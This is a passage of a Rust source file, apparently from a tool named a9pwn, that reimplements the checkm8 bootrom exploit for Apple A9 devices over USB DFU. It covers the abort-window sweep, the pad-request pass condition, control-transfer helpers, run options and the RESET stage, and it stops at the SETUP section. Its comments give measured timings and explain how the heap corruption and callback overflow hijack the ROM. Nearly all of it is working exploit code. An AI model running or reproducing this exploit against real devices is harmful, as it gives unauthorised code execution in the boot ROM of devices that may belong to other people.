//! The four checkm8 stages and the round loop. FROZEN SURFACE — `INTERFACE.md` §4.
//!
//! The algorithm is gaster's, not ours. What this file adds is a **bounded,
//! instrumented** SETUP sweep and an honest transport contract:
//!
//! * The reference's SETUP loop is `for(;;)` with no output (gaster.c:852-858).
//!   That unbounded silence is what cost this project a session: a 35 KB log of
//!   one identical pad-request line, with nothing recording which abort window
//!   was tried or what the pad request actually returned. Here every attempt
//!   logs the abort window in ms, the measured abort duration in µs, the bytes
//!   the aborted transfer delivered, the pad length requested and the pad
//!   request's observed outcome — and the whole sweep is capped by
//!   [`SetupBudget`].
//! * The pass condition is a **STALL on the pad request** (gaster.c:853), not
//!   `OK` and not a timeout. A timeout means the device is NAKing, which is the
//!   signature of the failure we are chasing, so timeouts are counted and named
//!   rather than folded into "did not pass".
//! * The bus reset after **every** stage attempt (gaster.c:1268) is not an
//!   optimisation target. It cleans the DFU state, and after PATCH it is what
//!   fires the overwritten `dfu_handle_bus_reset` callback. It is verified, not
//!   trusted: gaster discards `libusb_reset_device`'s result, and on Windows
//!   that call returns success even when it only cycled pipes
//!   (`windows_winusb.c:3419`), so `run` consults the reset report and refuses.
//!
//! Stage order, fixed (gaster.c:1231-1276):
//! `RESET → SETUP → SPRAY → PATCH → bus reset → re-open → check PWND`, and a
//! failed stage sends the machine back to RESET.

use std::collections::BTreeMap;
use std::thread::sleep;
use std::time::{Duration, Instant};

use crate::config::{all_configs, config_for_identity, PayloadKind, SocConfig};
use crate::payload::{self, BuiltPayload, OVERWRITE_STRUCT_SIZE};
use crate::trace::{kind, Tracer};
use crate::types::{
    DeviceIdentity, DriverClass, ResetCapability, ResetEvidence, RunOutcome, Stage, XferResult,
    XferStatus,
};
use crate::usb::{
    reset_error_is_device_absent, CtrlReq, ResetCall, ResetReport, Transport,
};
use crate::{
    DFU_CLRSTATUS, DFU_DNLOAD, DFU_FILE_SUFFIX_LEN, DFU_GETSTATUS, DFU_MAX_TRANSFER_SZ,
    DFU_STATE_MANIFEST, DFU_STATE_MANIFEST_SYNC, DFU_STATE_MANIFEST_WAIT_RESET, DFU_STATUS_OK,
    EP0_MAX_PACKET_SZ,
};

// ---------------------------------------------------------------------------
// The unresolved parameter
// ---------------------------------------------------------------------------

/// gaster's `USB_MAX_STRING_DESCRIPTOR_IDX` (gaster.c:52), used as `wIndex` on
/// every leak request (gaster.c:866, 875, 886).
pub const LEAK_WINDEX_GASTER: u16 = 0x0A;

/// The alternative `wIndex`, kept as a parameter because this is the one
/// parameter of the algorithm we have not resolved against real hardware.
///
/// **Provenance, corrected** (`docs/VERIFICATION-live-run.md` §6 / B5). This
/// constant's value is frozen by `INTERFACE.md` §4 and is left alone, but the
/// claim that `0x00` is what ipwndfu passes is **not supported by the vendored
/// ipwndfu**: `research/refs/ipwndfu/checkm8.py:123-124` passes `wIndex = 0x40A`
/// for `usb_req_leak` / `usb_req_no_leak` (gaster's `0x0A` at `gaster.c:52`,
/// used at `:866`/`:875`/`:886`), and ipwndfu's own config table
/// (`checkm8.py:439-449`) has **no A9 row at all** — it cannot be a second
/// opinion on this silicon. `a9ctl/src/checkm8.rs:108` is the one that used
/// `0x40A` and attributed it to ipwndfu.
///
/// So: `0x0A` is the only sourced value for CPID 0x8003, and `0x00` is an
/// **uncited** second value that exists here because the frozen interface says
/// it does. `a9pwn run --leak-windex-ipwndfu` selects this one — the flag's name
/// is a misnomer, and the genuine alternative (`0x40A`) is not reachable from
/// the CLI. Neither is claimed as measured.
pub const LEAK_WINDEX_IPWNDFU: u16 = 0x00;

/// Bound on the SPRAY loop, which in the reference is also `for(;;)`
/// (gaster.c:902). Deliberately *not* a module constant: the reference's loop is
/// unbounded and is bounded here only by the run-level budget
/// (`RunOptions::setup_budget`, the only bounded-spin budget the frozen option
/// set carries), with every iteration logged.

/// gaster's own default, and the value every run of the previous session used.
const DEFAULT_USB_TIMEOUT_MS: u32 = 5;

/// The pad request's default timeout: **gaster's own `usb_timeout` value**.
///
/// Not because the pad is unimportant — it IS the pass condition — but because
/// raising it does not buy the device time to answer a question; it buys the
/// device's ~21-37 ms EP0 **watchdog** enough time to fake a STALL, which is a
/// false pass with no corruption behind it. `--pad-timeout-ms` exists so that
/// experiment can still be run deliberately; the default must not manufacture it.
/// See [`RunOptions::pad_timeout_ms`] for the measurements.
const DEFAULT_PAD_TIMEOUT_MS: u32 = 5;

// ---------------------------------------------------------------------------
// Stage results
// ---------------------------------------------------------------------------

/// A stage failure, with a stable machine-greppable code and the last transfer
/// that was in flight. `code` is what a reader greps for; `detail` is what a
/// human reads; `last` is the evidence.
///
/// Codes emitted by this module:
///
/// | code | meaning |
/// |---|---|
/// | `RESET_SUFFIX_NOT_ACCEPTED` | the 16-byte DNLOAD of RESET did not return OK/16 |
/// | `RESET_STATE_FAILED` | the DFU state machine did not reach MANIFEST_WAIT_RESET |
/// | `RESET_FLUSH_NOT_ACCEPTED` | the trailing 0x40-byte DNLOAD of RESET failed |
/// | `SETUP_BUDGET_EXHAUSTED` | the sweep hit `SetupBudget` without a pad STALL |
/// | `SETUP_PAD_LENGTH_INVALID` | `overwrite_pad - transferred` does not fit a u16 |
/// | `SPRAY_UNSUPPORTED_CHIP` | SPRAY's A9 branch was asked for a non-A9 die |
/// | `SPRAY_UNSUPPORTED_LARGE_LEAK` | `large_leak != 0`: a heap layout we do not drive |
/// | `SPRAY_BUDGET_EXHAUSTED` | the stall/leak/no-leak loop never converged |
/// | `PATCH_OVERWRITE_NOT_STALLED` | the 48-byte callback overflow did not STALL |
/// | `PATCH_OVERWRITE_SIZE_INVALID` | the built overflow buffer is not one `dfu_callback_t` |
/// | `TRANSPORT_DEVICE_LOST` | the device disappeared mid-stage |
///
/// `PATCH_UPLOAD_SHORT` is deliberately **not** in that table: it is recorded as a
/// failed predicate (`trace::Counters::predicate_failed`), an event and a printed
/// warning, but it does **not** fail the stage. gaster's chunk loop cannot fail
/// (`gaster.c:226-240` returns true unconditionally and `:1215` passes
/// `transfer_ret = NULL`), so stopping there would discard the suffix, the end
/// DNLOAD and the MANIFEST walk — five of an attempt's seven transfers — from an
/// experiment the reference would have completed. See `stage_patch`.
///
/// All three fields are deliberate: `code` is what a reader greps for, `detail`
/// is what a human reads, `last` is the evidence. (`XferResult` is only
/// `Debug + Clone` in §1, so neither this type nor `StageResult` can derive
/// `PartialEq`; compare with `is_pass` / `fail_code` instead.)
#[derive(Debug, Clone)]
pub struct StageFail {
    pub code: &'static str,
    pub detail: String,
    pub last: Option<XferResult>,
}

#[derive(Debug, Clone)]
pub enum StageResult {
    Pass,
    Fail(StageFail),
}

impl StageResult {
    pub fn is_pass(&self) -> bool {
        matches!(self, StageResult::Pass)
    }

    pub fn fail_code(&self) -> Option<&'static str> {
        match self {
            StageResult::Pass => None,
            StageResult::Fail(f) => Some(f.code),
        }
    }
}

fn fail(code: &'static str, detail: impl Into<String>, last: Option<XferResult>) -> StageResult {
    StageResult::Fail(StageFail {
        code,
        detail: detail.into(),
        last,
    })
}

// ---------------------------------------------------------------------------
// Options
// ---------------------------------------------------------------------------

/// Caps on the SETUP sweep. Both are honoured; whichever trips first wins.
///
/// **Per `stage_setup` call, i.e. per round** — the default is 20 000 attempts /
/// 600 000 ms, so a 64-round run in which SETUP never converges can occupy ≈10.6
/// hours, and SPRAY shares the same budget (≈21 h worst case). That is a
/// deliberate deviation from the reference, whose SETUP loop cannot exit at all
/// (`gaster.c:852`); the wall-clock is the price of it, and the operator sets
/// `--setup-budget` deliberately rather than discovering this at hour six
/// (`docs/VERIFICATION-live-run.md` D3/§5 row 5).
///
/// The wall-clock depends on [`RunOptions::pad_timeout_ms`]: at its default (5 ms,
/// gaster's value) a failing attempt costs roughly 15 ms of host work, so the
/// attempts cap is the binding one; a deliberately raised pad timeout makes the
/// millis cap trip first and the sweep shorter in attempts. Those are the same
/// knob seen from two sides, not a regression either way.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SetupBudget {
    pub max_attempts: u64,
    pub max_millis: u64,
}

impl Default for SetupBudget {
    fn default() -> Self {
        SetupBudget {
            max_attempts: 20_000,
            max_millis: 600_000,
        }
    }
}

#[derive(Debug, Clone)]
pub struct RunOptions {
    pub max_rounds: u32,
    /// gaster's `usb_timeout` (gaster.c:1631-1633 default 5).
    ///
    /// This is the **abort window** base and nothing else: `stage_setup` derives
    /// its sweep from it (`usb_timeout - 1`, then `(t+1) % (usb_timeout -
    /// abort_min + 1) + abort_min`) and every other request in the sweep uses it.
    /// Do not raise it to give the pad more time — a window above ~4 ms lets the
    /// whole 2048-byte DNLOAD through and the sweep stops being a sweep. The pad
    /// has its own timeout for exactly that reason.
    pub usb_timeout_ms: u32,
    /// The timeout for the **pad request only** (`bm=0, b=0, wValue=0, wIndex=0`,
    /// `wLength = overwrite_pad - transferred`) — the request that IS SETUP's
    /// pass condition (`gaster.c:853`).
    ///
    /// **Why it is a separate parameter.** gaster passes its global `usb_timeout`
    /// here because on Linux the device answers quickly. That value is an *abort
    /// window*, not a budget for how long a device may take to answer, so
    /// decoupling the two is right: an experiment can move the pad timeout without
    /// touching the sweep, whereas raising `usb_timeout_ms` would let the
    /// 2048-byte DNLOAD complete and destroy the abort sweep. The **default is
    /// gaster's 5 ms** — see the watchdog finding below for why it must not be
    /// raised silently.
    ///
    /// **The watchdog finding (MEASURED on this unit).** Every pad completion we
    /// have ever seen falls in **21.4-36.6 ms with none below 21 ms**: run 2's six
    /// (3 STALLs, 3 OKs) at 21.4, 22.9, 24.5, 25.3, 27.2, 27.9 ms, and a
    /// first-attempt STALL at 23.308 ms on a freshly re-entered device. A hard
    /// floor with no samples beneath it is a fixed device-side latency, not a
    /// timing race — this ROM **stalls a stuck EP0 request on a watchdog timer**
    /// at roughly 21-37 ms.
    ///
    /// That reframes SETUP. gaster's pad timeout is 5 ms, so gaster never sees
    /// that watchdog either — and gaster does pwn A9 devices. A genuine corruption
    /// STALL must therefore arrive **fast** (sub-millisecond to a few ms), and
    /// every STALL in our history is our own timeout stretching past the watchdog
    /// floor rather than evidence that the use-after-free happened at all. With a
    /// 40 ms pad timeout SETUP "passes" on essentially every attempt with no
    /// corruption behind it — a false pass, which is what this default prevents.
    ///
    /// **Operational rule: a pad STALL arriving at 20-40 ms is the watchdog and is
    /// NOT evidence of corruption. A genuine pass should be fast. Treat a slow
    /// STALL as a red flag in the trace, not as a win.**
    ///
    /// Since the pad now runs on the transport's true-deadline primitive, that
    /// rule is enforced rather than merely written down: at the default 5 ms the
    /// ~21-37 ms watchdog is unreachable, so **`pad_stall` goes to zero on every
    /// attempt and `pad_timeout` dominates — that is the correct outcome, not a
    /// regression.** A `pad_stall` that was really a watchdog is indistinguishable
    /// from a NAK, so counting it as a pass was never evidence of anything; with
    /// the true deadline, `PAD_TIMEOUT_NOT_STALL` firing on every attempt is an
    /// honest statement about the device instead of a lottery result.
    ///
    /// Raising this deliberately (via `--pad-timeout-ms`) is a legitimate
    /// experiment *provided* the latency of any resulting STALL is read as a
    /// verdict on the primitive rather than as success. The drain DNLOAD and the
    /// `DFU_GETSTATUS` reads stay on `usb_timeout_ms`; they are not the pass
    /// condition and a second variable must not move with this one.
    pub pad_timeout_ms: u32,
    /// gaster's `usb_abort_timeout_min` (gaster.c:1635-1637 default 0).
    pub abort_timeout_min_ms: u32,
    pub leak_windex: u16,
    pub dry_run: bool,
    pub verbose: bool,
    pub trace_path: Option<std::path::PathBuf>,
    pub allow_winusb: bool,
    pub stage_filter: Option<Stage>,
    pub setup_budget: SetupBudget,
    pub stop_after_setup_stall: bool,
    /// **Run the exploit even when the serial descriptor already carries the
    /// `PWND:[checkm8]` marker.**
    ///
    /// Without it, the round loop and `one_stage_core` treat a present marker as
    /// "the payload is already resident" and return [`RunOutcome::Pwned`] having
    /// transmitted **nothing** (`transfers=0`). That is rule 14's injury
    /// (`RUNG2-EVIDENCE.md` §6.0p): the marker is a value read at *some* prior
    /// enumeration, and a verdict built on it says the exploit ran when the
    /// counters say it did not. With `--force` the marker is *seen and reported*
    /// but does not short-circuit the write path.
    ///
    /// **Why this is needed, verbatim.** `transfers=0` on a skipped re-pwn is rule
    /// 14's injury; the buffer-read sequence requires re-pwning **while an image is
    /// held in the DFU buffer**, and a Power+Home (the only other way to clear the
    /// marker) destroys that image.
    pub force: bool,
    /// **DIAGNOSTIC DEVIATION — not part of gaster's sequence, and off by
    /// default so the shipped exploit path stays byte-identical to the
    /// reference.** When set, `stage_setup` issues one `DFU_GET_STATUS` between
    /// the aborted DNLOAD and the pad request and records the device's own
    /// `bState`, to separate two readings of `abort_xfer=0` on every attempt:
    ///
    /// * still `5` (`dfuDNLOAD-IDLE`) → the ROM never registered the DNLOAD, so
    ///   the primitive fails at its first step and no abort-timing work can fix
    ///   it;
    /// * `3` (`dfuDNLOAD-SYNC`) or `4` (`dfuDNBUSY`) → the ROM took the download
    ///   and is mid-transaction, so the request did register;
    /// * `10` (`dfuERROR`) → it registered and rejected it: a third answer.
    ///
    /// gaster never reads this (`gaster.c:853` goes straight from the cancel to
    /// the pad), so it is pure added information — and it costs one control
    /// transfer per attempt. **That cost is a real perturbation**: an extra EP0
    /// request sits inside the very request sequence whose shape is the heap
    /// corruption, so a probe run's STALL count cannot be compared with a
    /// non-probe run's. Read the probe run as "what state does the device report
    /// here", not as a better exploit attempt.
    pub probe_setup_state: bool,
    pub settle_ms: u32,
    /// Which resident handler a PATCH install places (`payload::HandlerVariant`).
    ///
    /// **`Stock` is the default and reproduces gaster byte for byte.** `ReadWindow` installs the
    /// in-tree handler that adds the `0xA1/0x1F` mailbox-free SRAM read (`readwindow`), which is
    /// the only request that can read the DFU buffer after an image has been staged into it. The
    /// handler is longer, so `payload_dest` moves from `0x1800E0F08` to `0x1800E0EA0`; both
    /// variants' digests are pinned separately. See `a9boot/HANDLER-RELOCATION.md`.
    pub handler: payload::HandlerVariant,
    /// Install the handler with its command MAILBOX at the S1 relocated base
    /// (`config::S1_MAILBOX_BASE` = receive base + `S1_APPEND_L`) instead of
    /// gaster's receive base — review/06 §7 S1's base+L append-relocation, the
    /// geometry `a9boot-host`'s `boot --via point-a` requires (its
    /// `BOOT_WINDOW_COLLISION` check refuses the colliding one). The one-shot
    /// callback keeps the receive base regardless: the split is in
    /// `payload::build_payload_variant`'s `mailbox` argument. Default = gaster
    /// parity, so every measured baseline is byte-identical.
    pub mailbox_relocated: bool,
}

impl Default for RunOptions {
    fn default() -> Self {
        RunOptions {
            max_rounds: 64,
            usb_timeout_ms: DEFAULT_USB_TIMEOUT_MS,
            pad_timeout_ms: DEFAULT_PAD_TIMEOUT_MS,
            abort_timeout_min_ms: 0,
            leak_windex: LEAK_WINDEX_GASTER,
            dry_run: false,
            verbose: false,
            trace_path: None,
            allow_winusb: false,
            stage_filter: None,
            setup_budget: SetupBudget::default(),
            stop_after_setup_stall: false,
            force: false,
            probe_setup_state: false,
            mailbox_relocated: false,
            settle_ms: 0,
            handler: payload::HandlerVariant::Stock,
        }
    }
}

impl RunOptions {
    fn timeout_ms(&self) -> u32 {
        self.usb_timeout_ms.max(1)
    }
}

/// The pad request's timeout. Pure and separate from [`RunOptions::timeout_ms`]
/// so a refactor cannot silently re-couple them: the pad must live long enough to
/// see the device answer (that answer is the pass condition), while the aborted
/// DNLOAD's window must stay short or the transfer completes and the sweep
/// degenerates. `0` is treated as `1`, like the abort window.
fn pad_timeout(opts: &RunOptions) -> u32 {
    opts.pad_timeout_ms.max(1)
}

pub struct StageIo<'a> {
    pub usb: &'a mut Transport,
    pub trace: &'a mut Tracer,
    pub cfg: &'a SocConfig,
    pub opts: &'a RunOptions,
}

// ---------------------------------------------------------------------------
// The abort sweep, as pure functions
// ---------------------------------------------------------------------------
//
// Extracted from the loop so the sweep can be pinned by tests without a device.
// This is the part `a9ctl` got wrong: its pump interval was 5 ms and its cancel
// deadline was only evaluated after each pump slice, so windows 0,1,2,3,4 all
// cancelled at >= 5 ms. Six labels, one experiment. Here the window *is* the
// deadline handed to the transport (`XferResult::abort_after_ms`), and every
// attempt logs the measured duration so a reader can see the windows differ.

/// gaster.c:849 — the sweep starts at `usb_timeout - 1`, **not** at 0 and not at
/// `abort_min`: gaster computes the first window before it ever consults
/// `usb_abort_timeout_min`, so an `abort_min` equal to `usb_timeout` still sees
/// one attempt at `usb_timeout - 1` before the cycle pins. Reproduced exactly,
/// because that first window is a real experiment.
pub fn initial_abort_window(usb_timeout_ms: u32, _abort_min_ms: u32) -> u32 {
    usb_timeout_ms.max(1) - 1
}

/// Number of distinct windows in the cycle: `usb_timeout - abort_min + 1`
/// (gaster.c:857). Saturating, so a nonsense option pair cannot divide by zero.
pub fn window_span(usb_timeout_ms: u32, abort_min_ms: u32) -> u32 {
    let t = usb_timeout_ms.max(1);
    let m = abort_min_ms.min(t);
    t - m + 1
}

/// gaster.c:857 — `(t + 1) % (usb_timeout - abort_min + 1) + abort_min`.
pub fn advance_abort_window(window: u32, usb_timeout_ms: u32, abort_min_ms: u32) -> u32 {
    let t = usb_timeout_ms.max(1);
    let m = abort_min_ms.min(t);
    let span = window_span(t, m);
    let w = window.clamp(m, m + span - 1);
    (w + 1) % span + m
}

/// The first `n` windows of a sweep, starting where gaster starts.
pub fn sweep_windows(usb_timeout_ms: u32, abort_min_ms: u32, n: usize) -> Vec<u32> {
    let mut w = initial_abort_window(usb_timeout_ms, abort_min_ms);
    let mut out = Vec::with_capacity(n);
    for _ in 0..n {
        out.push(w);
        w = advance_abort_window(w, usb_timeout_ms, abort_min_ms);
    }
    out
}

/// gaster's `send_usb_control_request_async_no_data` returns `completed != 0`
/// (gaster.c:243-283): the async transfer was **reaped**, whatever its terminal
/// status. gaster's callback sets `completed = 1` for every terminal libusb
/// status (gaster.c:220-223), so the reference's predicate at gaster.c:853 —
/// `send_async(...) && tr.sz < config_overwrite_pad` — evaluates `sz` and issues
/// the pad request **even after `LIBUSB_TRANSFER_ERROR`**.
///
/// That is deliberate in the reference and is reproduced here: the pad request is
/// about the heap state the aborted transfer left behind, and a URB that moved
/// bytes and *then* errored has still left that state. Windows can plausibly reap
/// a mid-data-stage babble as `TRANSFER_ERROR`, which is exactly the case where
/// declaring the attempt "not completed" would skip the pad and silently diverge
/// from gaster.
///
/// Only a device that is gone is not a measurement: `NoDevice` means there is
/// nothing left to pad, and the transport refuses further transfers on that
/// handle anyway. Every pad request logs the preceding abort's terminal status,
/// its transferred count and its `libusb_rc`, so if padding after an error turns
/// out to be the wrong call the trace shows it rather than hiding it.
pub fn abort_completed(r: &XferResult) -> bool {
    !matches!(r.status, XferStatus::NoDevice)
}

/// Did the transport refuse this transfer instead of running it?
///
/// The transport's refused/poisoned shape (`usb::Transport::refused`): status
/// `Error`, zero measured micros, and — the distinguishing field — no abort
/// window at all, because the transfer was never submitted. A genuinely reaped
/// `Error` always carries `abort_after_ms = Some(t)` from `control_async_abort`.
/// Used to stop a dead handle from being swept 20 000 times, and in SPRAY so a
/// never-submitted leak cannot be scored as a successful one (see
/// [`leak_satisfied`]).
pub fn abort_was_refused(r: &XferResult) -> bool {
    r.status == XferStatus::Error && r.abort_after_ms.is_none() && r.micros == 0
}

/// Did a SPRAY leak / no-leak transfer satisfy the reference's predicate —
/// `send_..._async_no_data(...) && transfer_ret.sz == 0` (gaster.c:866, :886)?
///
/// Two exclusions, both from the reference:
///
/// * `NoDevice` is not a measurement ([`abort_completed`]); the transport
///   refuses further transfers on that handle anyway.
/// * A **refused** transfer was never submitted, so it cannot stand in for
///   gaster's `completed != 0` clause (`gaster.c:282`). Without this exclusion a
///   device that died between the stall and the leak returns the refused shape
///   — `Error`, 0 bytes — which is `abort_completed` and `transferred == 0`, so
///   the leak *and* the no-leak would score as successes and SPRAY would return
///   `Pass` on a dead handle (`docs/VERIFICATION-live-run.md` B3).
///
/// Note what is deliberately **kept**: a reaped `Error` that moved 0 bytes still
/// satisfies the predicate, because gaster's own wrapper counts every terminal
/// status as completed (`gaster.c:220-223`, `:282`) — see [`abort_completed`].
pub fn leak_satisfied(r: &XferResult) -> bool {
    abort_completed(r) && !abort_was_refused(r) && r.transferred == 0
}

/// The pad request length, or `None` when gaster would not send one.
///
/// gaster.c:853: the pad is sent when the aborted transfer delivered *fewer*
/// than `config_overwrite_pad` bytes. A `0` from the host satisfies that (as it
/// does in the reference) — but `0` is read as "the host reported nothing",
/// never as "the device consumed zero bytes", which is why it is counted
/// separately in the sweep log.
pub fn pad_request_len(overwrite_pad: u32, transferred: usize) -> Option<u32> {
    if transferred as u64 >= overwrite_pad as u64 {
        return None;
    }
    Some(overwrite_pad - transferred as u32)
}

/// The **whole** of gaster.c:853's pass condition: the aborted transfer delivered
/// fewer than `overwrite_pad` bytes *and* the pad request came back `STALL`.
///
/// Pure, and split out of the sweep so the gate itself is pinned by a test.
/// Before this, `pad_predicate_matches_gaster_853` pinned only the length half
/// of the predicate, so the STALL requirement — the thing that *is* SETUP's
/// success signal, and the proof HANDOFF §6.3 exists to produce — rested on
/// inspection alone (`docs/VERIFICATION-live-run.md` Q1/Q2, B4).
///
/// `pad` is `None` when no pad request was sent, which happens when the aborted
/// transfer delivered `>= overwrite_pad`: gaster's `&&` short-circuits there, so
/// such an attempt cannot pass.
pub fn setup_passed(
    abort_transferred: usize,
    overwrite_pad: u32,
    pad: Option<&XferResult>,
) -> bool {
    if pad_request_len(overwrite_pad, abort_transferred).is_none() {
        return false;
    }
    matches!(pad, Some(p) if p.status == XferStatus::Stall)
}

// ---------------------------------------------------------------------------
// Low-level request helpers, named after gaster's
// ---------------------------------------------------------------------------

/// [`req_ctrl`] with an explicit timeout. Exactly one caller uses this: the pad
/// request, whose timeout is a parameter of its own ([`pad_timeout`]) because
/// that request is SETUP's pass condition and must outlive the Windows tick.
/// Every other request in the sweep keeps `usb_timeout_ms`.
///
/// **This must go through the transport's true-deadline primitive.** The
/// synchronous path cannot honour a timeout shorter than one system timer tick:
/// a nominal 5 ms wait returns anywhere in ~8-31 ms on this host, which is how a
/// ~21-37 ms device watchdog STALL got counted as a checkm8 pass. The primitive
/// sends the same zeroed data stage and the same setup packet — no wire parameter
/// moves — and reports a deadline expiry as `Timeout` (so `pad_timeouts` and
/// `PAD_TIMEOUT_NOT_STALL` keep counting what they always counted) with
/// `abort_after_ms = None` (so the tracer does not bucket the pad as a sweep
/// attempt). A device answer still arrives as its own status, so `Stall` remains
/// the pass condition and [`setup_passed`] is unchanged.
fn req_ctrl_with_timeout(io: &mut StageIo, r: CtrlReq, timeout_ms: u32) -> XferResult {
    io.usb
        .control_with_deadline_no_data(r, timeout_ms.max(1))
}

/// gaster's `send_usb_control_request_no_data` (gaster.c:467-480) over a fully
/// built request: a zeroed buffer of `r.length` bytes, or a true zero-length
/// transfer when `r.length == 0`.
///
/// Takes a [`CtrlReq`] so the wire parameters of the stages that matter
/// (SPRAY's triple, PATCH's overflow) come from pure constructors that a test
/// can pin — `docs/VERIFICATION-live-run.md` B4: a future edit that changed
/// PATCH's `wIndex = 0x80` (`gaster.c:1211`) to `0` was previously caught by
/// nothing in the suite.
fn req_ctrl(io: &mut StageIo, r: CtrlReq) -> XferResult {
    let timeout = io.opts.timeout_ms();
    req_ctrl_with_timeout(io, r, timeout)
}

/// gaster's `send_usb_control_request_no_data` (gaster.c:467-480) in the
/// reference's own argument order. Delegates to [`req_ctrl`]; the RESET and
/// SETUP call sites still spell their requests this way because that is how
/// `gaster.c` spells them.
fn req_no_data(io: &mut StageIo, bm: u8, b: u8, value: u16, index: u16, len: u16) -> XferResult {
    req_ctrl(
        io,
        CtrlReq {
            bm,
            b,
            value,
            index,
            length: len,
        },
    )
}

/// A real data-bearing control transfer, `gaster`'s `send_usb_control_request`
/// with a payload (gaster.c:226-240).
///
/// **The payload chunk is DELIBERATELY abandoned fast — do not "fix" this.** The
/// `0 of N acked` seen on chunk 0 is not a lost upload: it is **the checkm8
/// hijack firing during that very transfer**. The moment the overflow's callback
/// fires the CPU jumps into the payload and the ROM's DFU loop is gone, so the
/// control transfer's status stage never completes; the host must abandon it
/// QUICKLY and carry on (gaster's chunk loop "cannot fail" for exactly this
/// reason). MEASURED 2026-10-04, twice on a clean prober-free host: widening this
/// window to 1000 ms made every pwn afterwards LOSE the device from the bus —
/// the host held the transfer open for a full second while the payload ran its
/// MMU/ttbr0 patches. The short window is part of the exploit's timing.
fn req_out(io: &mut StageIo, r: CtrlReq, data: &[u8]) -> XferResult {
    let timeout = io.opts.timeout_ms();
    io.usb.control_out(r, data, timeout)
}

/// gaster's `send_usb_control_request_async_no_data` (gaster.c:482-495) over a
/// fully built request: the transfer is submitted and aborted after
/// `cancel_after_ms`, and the byte count that actually crossed is what the
/// caller decides on.
fn req_async_ctrl(io: &mut StageIo, r: CtrlReq, cancel_after_ms: u32) -> XferResult {
    let mut buf = vec![0u8; r.length as usize];
    io.usb.control_async_abort(r, &mut buf, cancel_after_ms)
}

/// The reference's argument order for the async helper. Delegates to
/// [`req_async_ctrl`].
fn req_async(
    io: &mut StageIo,
    bm: u8,
    b: u8,
    value: u16,
    index: u16,
    len: u16,
    cancel_after_ms: u32,
) -> XferResult {
    req_async_ctrl(
        io,
        CtrlReq {
            bm,
            b,
            value,
            index,
            length: len,
        },
        cancel_after_ms,
    )
}

/// gaster's `dfu_check_status` (gaster.c:819-827). The 6-byte reply is
/// `status, poll_timeout[3], state, str_idx`, so the state is byte 4.
///
/// `stage` is threaded in rather than hardcoded: the same poll is used by RESET's
/// `dfu_set_state_wait_reset` and by PATCH's trailing MANIFEST walk
/// (gaster.c:1220-1222), and logging a PATCH poll under RESET would make the
/// JSONL answer "which stage failed" wrongly — the exact class of lie this tool
/// exists to eliminate.
fn dfu_check_status(
    io: &mut StageIo,
    stage: Stage,
    status: u8,
    state: u8,
    label: &'static str,
) -> (bool, XferResult) {
    let mut buf = [0u8; 6];
    let timeout = io.opts.timeout_ms();
    let r = io.usb.control(
        CtrlReq {
            bm: 0xA1,
            b: DFU_GETSTATUS,
            value: 0,
            index: 0,
            length: 6,
        },
        &mut buf,
        timeout,
    );
    let ok = r.status == XferStatus::Ok
        && r.transferred == 6
        && buf[0] == status
        && buf[4] == state;
    io.trace.xfer(stage, label, &r);
    (ok, r)
}

/// gaster's `dfu_set_state_wait_reset` (gaster.c:829-834), short-circuiting in
/// the same order: a zero-length DNLOAD, then MANIFEST_SYNC, MANIFEST,
/// MANIFEST_WAIT_RESET.
fn dfu_set_state_wait_reset(io: &mut StageIo) -> (bool, Option<XferResult>) {
    let a = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, 0);
    io.trace.xfer(Stage::Reset, "reset_set_wait_reset_dnload_0", &a);
    if !(a.status == XferStatus::Ok && a.transferred == 0) {
        return (false, Some(a));
    }

    let mut last = a;
    for (state, label) in [
        (DFU_STATE_MANIFEST_SYNC, "reset_status_manifest_sync"),
        (DFU_STATE_MANIFEST, "reset_status_manifest"),
        (DFU_STATE_MANIFEST_WAIT_RESET, "reset_status_manifest_wait_reset"),
    ] {
        let (ok, r) = dfu_check_status(io, Stage::Reset, DFU_STATUS_OK, state, label);
        last = r;
        if !ok {
            io.trace.predicate(
                Stage::Reset,
                "dfu_set_state_wait_reset",
                false,
                &format!("state {state} was not reached; last reply {}", last.one_line()),
            );
            return (false, Some(last.clone()));
        }
    }
    io.trace.predicate(
        Stage::Reset,
        "dfu_set_state_wait_reset",
        true,
        "MANIFEST_SYNC -> MANIFEST -> MANIFEST_WAIT_RESET (gaster.c:829-834)",
    );
    (true, Some(last))
}

// ---------------------------------------------------------------------------
// RESET
// ---------------------------------------------------------------------------

/// gaster's `checkm8_stage_reset` (gaster.c:836-845): push the DFU state machine
/// into MANIFEST_WAIT_RESET so the next bus reset is the one that matters.
pub fn stage_reset(io: &mut StageIo) -> StageResult {
    io.trace
        .event("reset_begin", Some(Stage::Reset), "DFU state machine -> MANIFEST_WAIT_RESET");

    let suffix = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN);
    io.trace.xfer(Stage::Reset, "reset_dnload_suffix", &suffix);
    if !(suffix.status == XferStatus::Ok && suffix.transferred == DFU_FILE_SUFFIX_LEN as usize) {
        return reset_recovery(
            io,
            "RESET_SUFFIX_NOT_ACCEPTED",
            format!(
                "the {DFU_FILE_SUFFIX_LEN}-byte DNLOAD returned {} with {} bytes (gaster.c:840)",
                suffix.status, suffix.transferred
            ),
            suffix,
        );
    }

    let (ok, last) = dfu_set_state_wait_reset(io);
    if !ok {
        return reset_recovery(
            io,
            "RESET_STATE_FAILED",
            format!(
                "the device did not reach MANIFEST_WAIT_RESET. Last status reply: {}",
                last.as_ref().map(|r| r.one_line()).unwrap_or_default()
            ),
            last.unwrap_or(suffix),
        );
    }

    let flush = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ);
    io.trace.xfer(Stage::Reset, "reset_dnload_flush", &flush);
    if !(flush.status == XferStatus::Ok && flush.transferred == EP0_MAX_PACKET_SZ as usize) {
        return reset_recovery(
            io,
            "RESET_FLUSH_NOT_ACCEPTED",
            format!(
                "the trailing {EP0_MAX_PACKET_SZ:#X}-byte DNLOAD returned {} with {} bytes \
                 (gaster.c:840)",
                flush.status, flush.transferred
            ),
            flush,
        );
    }

    StageResult::Pass
}

/// gaster.c:843 — clear the DFU status so the driver's next attempt starts from
/// a clean state machine rather than inheriting this failure.
fn reset_recovery(
    io: &mut StageIo,
    code: &'static str,
    detail: String,
    last: XferResult,
) -> StageResult {
    let clr = req_no_data(io, 0x21, DFU_CLRSTATUS, 0, 0, 0);
    io.trace.xfer(Stage::Reset, "reset_clr_status_recovery", &clr);
    fail(code, detail, Some(last))
}

// ---------------------------------------------------------------------------
// SETUP
